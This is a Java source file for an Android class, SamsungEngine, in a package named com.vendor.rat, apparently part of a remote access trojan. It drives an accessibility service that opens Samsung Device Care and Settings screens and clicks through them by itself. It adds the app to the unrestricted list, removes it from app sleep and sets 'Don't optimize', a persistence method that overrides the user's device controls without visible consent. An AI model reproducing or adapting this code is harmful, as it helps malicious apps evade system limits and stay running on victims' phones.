package com.vendor.rat.auto.engine.vendor;

import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 三星厂商适配引擎 (模块 03)
 *
 * 适配:
 *   - 电池优化排除 (com.samsung.android.lool)
 *   - 自启动管理
 *   - 后台限制
 *
 * 监听的界面:
 *   - BatteryActivity (Device Care 电池管理)
 *   - AppSleepActivity (应用睡眠)
 *   - SubSettings (设置子页面)
 *
 * 三星与原生 Android 最接近，逻辑相对简单
 * 市场份额: ~10%
 */
public class SamsungEngine extends AutoEngine {

    private static final String TAG = "SamsungEngine";

    // 三星包名
    private static final String DEVICE_CARE = "com.samsung.android.lool";
    private static final String SMART_MANAGER = "com.samsung.android.sm";
    private static final String SETTINGS = "com.android.settings";

    // 三星 Activity
    private static final String BATTERY_ACTIVITY =
        "com.samsung.android.lool.battery.BatteryActivity";
    private static final String APP_SLEEP_ACTIVITY =
        "com.samsung.android.lool.battery.AppSleepActivity";
    private static final String SUB_SETTINGS =
        "com.android.settings.SubSettings";

    // 状态标志
    private final AtomicBoolean batteryDone = new AtomicBoolean(false);
    private final AtomicBoolean backgroundDone = new AtomicBoolean(false);

    // 应用名称
    private String appName;

    public SamsungEngine() {
        super(buildWindowMatchers(), DEVICE_CARE);

        scheduler.schedule(new Runnable() {
            @Override
            public void run() {
                checkPermissionStatus();
            }
        }, 100L, TimeUnit.SECONDS);
    }

    /**
     * 构建窗口匹配列表
     */
    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 1. Device Care 电池管理
        WindowMatcher battery = new WindowMatcher(DEVICE_CARE, BATTERY_ACTIVITY);
        battery.addEventType(32);
        battery.addEventType(16384);
        list.add(battery);

        // 2. 应用睡眠
        list.add(new WindowMatcher(DEVICE_CARE, APP_SLEEP_ACTIVITY));

        // 3. Smart Manager (旧三星)
        list.add(new WindowMatcher(SMART_MANAGER));

        // 4. 设置子页面
        list.add(new WindowMatcher(SETTINGS, SUB_SETTINGS));

        return list;
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        log("Window matched: " + packageName + "/" + className);

        try {
            if (BATTERY_ACTIVITY.equals(className)) {
                handleBatteryPage();
            } else if (APP_SLEEP_ACTIVITY.equals(className)) {
                handleAppSleepPage();
            } else if (SUB_SETTINGS.equals(className)) {
                handleSubSettingsPage();
            }
        } catch (Exception e) {
            logError("Error handling window", e);
        }
    }

    @Override
    public void execute() {
        openBatteryOptimization();
    }

    // ============ 电池优化 ============

    /**
     * 打开三星 Device Care 电池管理
     */
    private void openBatteryOptimization() {
        try {
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service == null) return;

            Intent intent = new Intent();
            intent.setComponent(new ComponentName(DEVICE_CARE, BATTERY_ACTIVITY));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            service.startActivity(intent);
            log("Opened Device Care battery");
        } catch (Exception e) {
            logError("Failed to open Device Care", e);
            // 尝试 Smart Manager
            try {
                MyAccessibilityService service = MyAccessibilityService.getInstance();
                if (service == null) return;
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(SMART_MANAGER,
                    "com.samsung.android.sm.battery.ui.BatteryActivity"));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                service.startActivity(intent);
            } catch (Exception e2) {
                logError("Smart Manager path also failed", e2);
            }
        }
    }

    /**
     * 处理电池管理页面
     * 三星: 找到 "后台限制" 或 "后台使用限制" → 找到应用 → 移除限制
     */
    private void handleBatteryPage() {
        if (batteryDone.get()) return;

        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找 "后台使用限制" 或 "应用睡眠"
        UiNode backgroundLimit = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.textView("后台使用限制"),
                CombineFilter.textView("后台限制"),
                CombineFilter.textView("应用睡眠"),
                CombineFilter.textView("App power management")
            )
        );

        if (backgroundLimit != null) {
            backgroundLimit.click();
            log("Clicked background limit setting");
            sleep(1000);
        }

        // 查找 "不受限应用" 或 "从不睡眠"
        root = getRootNode();
        if (root != null) {
            UiNode unrestricted = root.findOneByCombine(
                CombineFilter.or(
                    CombineFilter.textView("不受限应用"),
                    CombineFilter.textView("从不睡眠"),
                    CombineFilter.textView("永不睡眠"),
                    CombineFilter.textView("Unrestricted apps")
                )
            );

            if (unrestricted != null) {
                unrestricted.click();
                log("Clicked unrestricted apps");
                sleep(1000);
                addAppToUnrestricted();
            }
        }
    }

    /**
     * 将应用添加到不受限列表
     */
    private void addAppToUnrestricted() {
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找应用
        UiNode appNode = findAppNode(root);
        if (appNode == null) {
            UiNode scrollable = getScrollableNode();
            if (scrollable != null) {
                appNode = scrollable.scrollForwardUntil(buildAppNameFilter());
            }
        }

        if (appNode != null) {
            // 查找附近的 Switch
            UiNode parent = appNode.findClickableParent();
            if (parent != null) {
                UiNode switchBtn = parent.findOneByClassName("android.widget.Switch");
                if (switchBtn != null && !switchBtn.isChecked()) {
                    switchBtn.click();
                    log("Added app to unrestricted list");
                    batteryDone.set(true);
                    sleep(500);
                    performBack();
                } else if (switchBtn != null) {
                    batteryDone.set(true);
                }
            } else {
                // 直接点击
                appNode.click();
                log("Clicked app node");
                batteryDone.set(true);
            }
        }
    }

    /**
     * 处理应用睡眠页面
     */
    private void handleAppSleepPage() {
        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找应用并确保不在睡眠列表
        UiNode appNode = findAppNode(root);
        if (appNode != null) {
            // 如果应用在列表中，取消选中
            UiNode checkBox = appNode.findClickableParent();
            if (checkBox != null) {
                UiNode cb = checkBox.findOneByClassName("android.widget.CheckBox");
                if (cb != null && cb.isChecked()) {
                    cb.click();
                    log("Removed app from sleep list");
                    backgroundDone.set(true);
                }
            }
        }
    }

    /**
     * 处理设置子页面
     */
    private void handleSubSettingsPage() {
        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找 "电池优化" → "所有应用" → 找到应用 → 选择"不优化"
        UiNode notOptimize = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.textView("不优化"),
                CombineFilter.textView("Don't optimize"),
                CombineFilter.textView("无限制")
            )
        );

        if (notOptimize != null) {
            notOptimize.click();
            log("Selected '不优化'");
            batteryDone.set(true);
            sleep(500);

            // 点击 "完成" 或 "确定"
            root = getRootNode();
            if (root != null) {
                UiNode doneBtn = root.findOneByCombine(
                    CombineFilter.or(
                        CombineFilter.button("完成"),
                        CombineFilter.button("确定"),
                        CombineFilter.button("Done")
                    )
                );
                if (doneBtn != null) {
                    doneBtn.click();
                    log("Clicked done button");
                }
            }
        }
    }

    // ============ 工具方法 ============

    private UiNode findAppNode(UiNode root) {
        if (appName != null && !appName.isEmpty()) {
            return root.findOneByTextContains(appName);
        }
        return root.findOneByTextContains("com.vendor.rat");
    }

    private NodeFilter buildAppNameFilter() {
        if (appName != null && !appName.isEmpty()) {
            return StringCondition.textContains(appName);
        }
        return StringCondition.textContains("com.vendor.rat");
    }

    private void checkPermissionStatus() {
        if (batteryDone.get() && backgroundDone.get()) {
            log("All Samsung permissions granted");
            finish();
        }
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }
}
